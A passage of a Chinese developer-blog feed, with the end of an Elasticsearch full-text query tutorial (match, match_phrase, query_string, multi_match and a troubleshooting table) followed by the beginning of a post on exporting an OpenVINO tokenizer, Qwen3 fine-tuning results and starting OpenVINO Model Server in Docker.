<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">添加数据1</span>
POST /wzk-property/_doc/
{
  "title": "小米电视4A",
  "images": "https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1",
  "price": 4288
}
<span class="hljs-meta prompt_">
# </span><span class="bash">添加数据2</span>
POST /wzk-property/_doc/
{
  "title": "小米手机",
  "images": "https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1",
  "price": 2699
}
<span class="hljs-meta prompt_">
# </span><span class="bash">添加数据3</span>
POST /wzk-property/_doc/
{
  "title": "华为手机",
  "images": "https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1",
  "price": 5699
}

</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8e62e75d3dd4325aadeb717ac85e3f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=Vd%2BQCg2V2ek%2BjI%2BZt89vXGLXh%2Bc%3D" alt="Elasticsearch 添加数据" loading="lazy"/>
我们进行or关系的match搜索，会把查询条件进行分词，然后进行查询，多个词条之间是or的关系：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match 分词匹配</span>
POST /wzk-property/_search
{
  "query":{
    "match":{
      "title":"小米电视4A"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ead348e025844c282790987fac61c7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=IdSvEIebWmZHsUefA1GA846YSUI%3D" alt="Elasticsearch 匹配查询" loading="lazy"/>
我们可以看到，不仅查到了小米电视、还查询到了小米手机。这不是我们要的结果。此时我们需要使用 and 的方式来进行精确的查找：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match 分词匹配 title字段 同时 分词后的每个词 都要匹配到才可以（and）</span>
POST /wzk-property/_search
{"query":
  {
    "match": {
      "title":
      {
        "query": "小米电视4A",
        "operator": "and"
      }
    }
  }
}
</code></pre>
<p>执行结果如下，可以看到已经精准匹配到了：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb174886256b473c8c2de36e96ffe61b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=6IcgOkYqgo%2F%2F8iAyyj3UwMRKrpw%3D" alt="Elasticsearch 精确匹配" loading="lazy"/></p>
<h3 data-id="heading-6">短语搜索（match phrase query）</h3>
<p>match_query是分词的，text也是分词的，match_phrase的分词结果必须在text字段中都包含，而且顺序必须相同，而且必须是连续的：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">分词匹配但考虑顺序</span>
<span class="hljs-meta prompt_"># </span><span class="bash">match是不考虑分词出现的顺序</span>
<span class="hljs-meta prompt_"># </span><span class="bash">match_phrase 将遵循分词的出现顺序才进行匹配</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": "小米电视"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1677f2caa9ff45c6923b909a7002a90a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=FoB50mVBH1P5pUfrecnOq1IP7rc%3D" alt="Elasticsearch 短语搜索" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match_phrase 分伺后：1电视 2小米</span>
<span class="hljs-meta prompt_"># </span><span class="bash">因为条目中 小米电视的出现不是 1、2，所以没有匹配到</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": "电视小米"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0342630862694425970d054a43400807~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=5n%2FkvCNQFpU1nw3rvxXPeMlGUM4%3D" alt="Elasticsearch 分词检索" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">match_phrase 分词 1是小米 2是4A</span>
<span class="hljs-meta prompt_"># </span><span class="bash">但是由于 原：小米电视4A，对比中没有严格按照1、2的顺序</span>
<span class="hljs-meta prompt_"># </span><span class="bash">所以没有结果</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": "小米4A"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/520e6cff3b074129b28e8c611e167312~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=ACwzt5jX2Kszyxgb3yOv3Gokj80%3D" alt="Elasticsearch 分词检索" loading="lazy"/>
但是对于刚才的结果，可能我们希望使用  小米4A，可以按照 match_phrase 的顺序来查找到 小米电视4A，而不用严格遵守顺序，可以跳过几个词：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">通过 slop 可以跳过一个词 来让 match_phrase 匹配到顺序的结果</span>
POST /wzk-property/_search
{
  "query": {
    "match_phrase": {
      "title": {
        "query": "小米4A",
        "slop": 1
      }
    }
  }
}
</code></pre>
<h3 data-id="heading-7">query_string 查询</h3>
<p>该查询与match类似，但是match需要指定字段名，query_string是在所有字段中搜索，范围更广泛。
Query String Query提供了无需指定某字段而对文档全文进行匹配查询的一个高级查询，同时可以指定在哪些字段上进行匹配。</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">广泛查询 所有字段中查找 2699</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "2699"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2983d5a471634275947a29a92171c65f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=XrQfm7kOX3cWDmEuUB2UjwL9mZM%3D" alt="Elasticsearch query string" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">广泛查找 但是你希望从这个default_field字段中查找</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "2699",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8660078aa59c4da78c3a58e0e49687c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=FA1BIylTjULSZVpirRXf8n%2FAMPY%3D" alt="Elasticsearch match phrase" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">逻辑查询 使用 OR 或者 AND</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "手机 OR 小米",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78192c1b709c412b8d5f359fa5ec5de1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=P0jdZdEy0MdvGU6DiVdKDHZOlTs%3D" alt="Elasticsearch 查询数据" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">逻辑查询 使用 OR 或者 AND</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "手机 AND 小米",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d898d32254154fdf92d709fcbe6f7d2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=6CZk%2FMDczIua%2F8Uh4b7posbrUxI%3D" alt="Elasticsearch 逻辑查询" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">模糊查询，表示 小米 这个词可以有1个词变动</span>
<span class="hljs-meta prompt_"># </span><span class="bash">比如：小明、米小 都是可以查询出来的</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "小米~1",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afb0afa7494f45d984654e355f01ba7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=3pvVWHu6ZJ3E%2Fgck%2BrioJJ%2B3NTw%3D" alt="Elasticsearch 查询结果" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">模糊查询，表示 小米 这个词可以有1个词变动</span>
<span class="hljs-meta prompt_"># </span><span class="bash">比如：小明、米小 都是可以查询出来的</span>
<span class="hljs-meta prompt_"># </span><span class="bash">以此类推，如果是 小米~2 那就两个词都可以变动...</span>
POST /wzk-property/_search
{
  "query": {
    "query_string": {
      "query": "米小~1",
      "default_field": "title"
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43ae7969ed614f55ab7310ae8c02d67f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=jN%2Bc5J%2Bu3Jv0fVSklrpiHRoh8fo%3D" alt="Elasticsearch 查询" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">多字段支持</span>
POST /lagou-property/_search
{
  "query": {
    "query_string" : {
      "query":"2699",
      "fields": [ "title","price"]
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cca1973dc5b8497ca1c0f928cf019d4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=RbrK1UiUPj5%2BJs2VQtIz3I2CPT4%3D" alt="Elasticsearch 查询结果" loading="lazy"/></p>
<h3 data-id="heading-8">多字段匹配查询（multi match query）</h3>
<p>如果你需要在多个字段上进行文本搜索，可用multi_match，multi_match在match的基础上支持对多个字段进行文本查询。</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">multi_match 是 match查询的一种扩展方式，用于在多个字段上进行查询</span>
POST /wzk-property/_search
{
  "query": {
    "multi_match" : {
      "query":"小米4A",
      "fields": [ "title","images"]
    }
  }
}
</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dc0771c871c4adcaefa9db9047c02b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=8j4yZq6DHAYibfYsbwesCLmWjs8%3D" alt="Elasticsearch 多字段匹配" loading="lazy"/></p>
<h2 data-id="heading-9">错误速查</h2>















































<table><thead><tr><th>症状</th><th>根因</th><th>定位</th><th>修复</th></tr></thead><tbody><tr><td>用 match 查询“小米电视4A”，结果把“小米手机”也查出来</td><td>match 默认 operator=OR，中文分词后任意一个词命中即算匹配</td><td>在 Kibana 中使用 _analyze 查看 title 分词结果，确认分词粒度</td><td>在 match 中显式设置 "operator": "and"，或改用 keyword/精确匹配字段承载商品名</td></tr><tr><td>match_phrase 查不到预期文档（如“电视小米”“小米4A”均无结果）</td><td>match_phrase 要求分词顺序与位置连续，默认不允许跳词</td><td>用 _analyze 查看短语分词顺序，对比 _source.title 的实际分词顺序</td><td>使用 "slop": N 放宽位置约束，或改写查询短语与文案保持一致</td></tr><tr><td>query_string 报解析错误或查不到数据</td><td>query_string 语法较复杂，逻辑运算符、特殊字符未转义，或 default_field 不含目标内容</td><td>查看 Kibana 报错信息，逐步简化 query 字符串，只保留单词验证</td><td>避免直接透传用户输入，必要时对 `+ - &amp;&amp;</td></tr><tr><td>使用 query_string 模糊查询“小米~1”但结果过多或过少</td><td>模糊匹配基于编辑距离，且受 analyzer 影响，并非“看起来相似就一定命中”</td><td>对同一单词分别用 _analyze 和 query_string 测试，观察实际命中词条</td><td>明确业务接受的模糊程度，合理设置 ~1/~2，必要时改为前缀/通配符或拼音索引等更明确方案</td></tr><tr><td>multi_match 跨字段查询命中不符合预期</td><td>多字段中字段类型和分词方式不同，score 被某个字段主导，导致排序或命中偏移</td><td>查看 mapping 中各字段的 type/analyzer，并用单字段 match 对比效果</td><td>在 multi_match 中显式配置 fields 权重（如 "title^3"），或统一文本字段的 analyzer，避免 keyword 与 text 混用产生误解</td></tr><tr><td>match_all 能查到文档，但任一全文查询都查不到</td><td>字段被映射为 keyword 或未被索引，全文查询打在错误字段上</td><td>用 mapping 接口确认字段 type 及 index 属性，检查查询 JSON 中的字段名拼写</td><td>将字段改为 text 或设置合适的多字段（text + keyword），并校正 DSL 中的字段名，重建索引后再次验证</td></tr></tbody></table>
<h2 data-id="heading-10">其他系列</h2>
<h3 data-id="heading-11">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-132 Java 生态前沿 2025：Spring、Quarkus、GraalVM、CRaC 与云原生落地</strong></p>
<h3 data-id="heading-12">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-180 Java 接入 FastDFS：自编译客户端与 Maven/Spring Boot 实战</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 已完结，OSS正在更新... 深入浅出助你打牢基础！</p>
<h3 data-id="heading-13">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【从零开始】19. 模型实测与验证]]></title>    <link>https://juejin.cn/post/7579893536105840646</link>    <guid>https://juejin.cn/post/7579893536105840646</guid>    <pubDate>2025-12-05T03:22:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579893536105840646" data-draft-id="7579846221168230454" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【从零开始】19. 模型实测与验证"/> <meta itemprop="keywords" content="人工智能,LLM"/> <meta itemprop="datePublished" content="2025-12-05T03:22:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Kida的躺平小屋"/> <meta itemprop="url" content="https://juejin.cn/user/1684864740889758"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【从零开始】19. 模型实测与验证
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1684864740889758/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Kida的躺平小屋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:22:43.000Z" title="Fri Dec 05 2025 03:22:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在真正开讲之前需要补充一下“16. 基于 CPU 的转换、量化实现”和“18. 持续优化模型微调”中遗漏的信息。</p>
<h4 data-id="heading-0">“基于 CPU 的转换、量化实现”内容补充</h4>
<p>在这章我通过 Python 导出基于 OpenVINO 的 IR 模型后并没有将对应的 tokenizer 导出。这会导致调用 apply_chat_template 进行推理时出现以下报错：</p>
<pre><code class="hljs language-bash" lang="bash">[2025-11-25 11:20:07,191]_apply_template - Template application failed, using raw string: Check <span class="hljs-string">'!chat_tpl.empty()'</span> failed at ../../../../src/cpp/src/tokenizer/tokenizer.cpp:655:
Chat template wasn<span class="hljs-string">'t found. This may indicate that the model wasn'</span>t trained <span class="hljs-keyword">for</span> chat scenario. Please add <span class="hljs-string">'chat_template'</span> to tokenizer_config.json to use the model <span class="hljs-keyword">in</span> chat scenario. For more information see the section Troubleshooting <span class="hljs-keyword">in</span> README.md
</code></pre>
<p>为此，这里补上 export_tokenizer 函数用于导出 tokenizer 配置。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_tokenizer</span>(<span class="hljs-params">self</span>):
    <span class="hljs-comment"># 导入 openvino_tokenizers</span>
    <span class="hljs-keyword">from</span> openvino_tokenizers <span class="hljs-keyword">import</span> convert_tokenizer
    <span class="hljs-comment"># 导入 openvino</span>
    <span class="hljs-keyword">from</span> openvino <span class="hljs-keyword">import</span> save_model

    <span class="hljs-comment"># 使用 huggingface 模式加载量化后的 tokenizer</span>
    hf_tokenizer = AutoTokenizer.from_pretrained(
        self.unsloth_merge_model_dir,
        trust_remote_code=<span class="hljs-literal">True</span>
    )

    <span class="hljs-comment"># 对 tokenizer 进行转换</span>
    ov_tokenizer, ov_detokenizer = convert_tokenizer(hf_tokenizer, with_detokenizer=<span class="hljs-literal">True</span>)

    <span class="hljs-comment"># 导出基于 ov 的 tokenizer 和 detokenizer </span>
    save_model(ov_tokenizer, os.path.join(self.openvino_int4_model_dir,<span class="hljs-string">"openvino_tokenizer.xml"</span>))
    save_model(ov_detokenizer, os.path.join(self.openvino_int4_model_dir,<span class="hljs-string">"openvino_detokenizer.xml"</span>))
</code></pre>
<p><strong>这里我们不能直接使用 Huggingface 的 tokenizer_config.json</strong>（虽然上面报错说 tokenizer_config.json 中找不到 ‘chat_template’ 参数）。事实上由于我们使用的是 OpenVINO 方案，因此需要对 Huggingface 的 hf_tokenizer 后进行进一步的转换（ convert_tokenizer -&gt; save_model）后方可使用。</p>
<p>我们可以将 export_tokenizer 追加到 start_to_export 函数末尾即可：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_to_export</span>(<span class="hljs-params">self</span>):

    ...

    <span class="hljs-keyword">try</span>:
        self.export_tokenizer()
    <span class="hljs-keyword">except</span> Exception:
        logger.error(<span class="hljs-string">"FATAL: Tokenizer export failed. Cannot proceed with openvino-genai."</span>)
        sys.exit(<span class="hljs-number">5</span>)

    logger.info(<span class="hljs-string">"Done."</span>)
</code></pre>
<h4 data-id="heading-1">“持续优化模型微调”内容补充</h4>
<p>其实 <strong>1.2287</strong> 并不是我的最终答案。后来我趁放假补充了训练数据量后又做了三次调优。最终模型得分（Loss）定格在 <strong>0.8698</strong>。超参数组合如下：</p>
<pre><code class="hljs language-bash" lang="bash">训练数据：678915
最终得分 (Loss): 0.8698
验证集损失 (Eval Loss): 0.8698
训练集损失 (Train Loss): 0.8652
最优超参数组合：
{
  <span class="hljs-string">"learning_rate"</span>: <span class="hljs-string">"2e-4"</span>,
  <span class="hljs-string">"max_steps"</span>: 7500,
  <span class="hljs-string">"r"</span>: 256,
  <span class="hljs-string">"lora_alpha"</span>: 512,
  <span class="hljs-string">"per_device_train_batch_size"</span>: 32,
  <span class="hljs-string">"gradient_accumulation_steps"</span>: 8,
  <span class="hljs-string">"max_seq_length"</span>: 8192
}
</code></pre>
<p>经复盘发现继续微调下去意义不是很大，毕竟基于现有的资源（硬件资源和数据资源）不会有太大的性能提升，因此后面将以这个作为基线开展工作（除非接下来的“问答验证”环节中评估分数太低，这时就需要调整数据精度并重新训练）。</p>
<hr/>
<p>好啦，书接上回。上一章节我们已经做完模型的持续调优了，接下来就需要将模型导出部署并进行“问答验证”。</p>
<p>看过我博客的小伙伴都知道，之前我尝试过 Optimum Intel 套件直接驱动 Qwen1.5 7B 的 GGUF 模型（属于实验性质），在单用户提问时响应速度还算可以，但准确率嘛就有点“吓人”了。除了幻觉严重外，自控能力还非常有限（无限输出）。但毕竟是低版本模型嘛，可以理解...可以理解。</p>
<p>这次我带着微调后的 Qwen3 0.6B 模型又来挑战了，除了使用垂直领域知识进行微调外，在 OpenVINO 驱动上相较于之前做了大量的改进。同样在自己的 MBP 上进行验证，希望能有个好结果吧。</p>
<h3 data-id="heading-2">1.OpenVINO Model Server（OVMS）与思维链</h3>
<p>由于 Qwen3 模型是带有思维链模式的，看了一遍 OpenVINO 的官方文档，目前只有 OpenVINO Model Server (OVMS) 提供 --reasoning_parser 参数用于思考链推理，而且也只支持 qwen3。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7a1fdc4a1e948a59faa95e58c56c402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=7NQ90PxFwu5LbI0rgH%2Be2e66nA4%3D" alt="" loading="lazy"/></p>
<p>OVMS 目前只支持 Linux 和 Windows 平台，我大 Mac 只能选择 Docker 解决方案。</p>
<p>事不宜迟，Checkout 最新镜像（openvino/model_server:latest）后启动 OVMS 服务。</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
-p 8000:8000 \
-p 9000:9000 \
-v &lt;int4_path&gt;/models:/models \
openvino/model_server:latest \
--model_path /models/model1 \
--model_name Qwen3-0.6R \
--reasoning_parser qwen3 \
--rest_port 8000 \
--port 9000 
</code></pre>
<p>使用以上命令启动后得到输出</p>
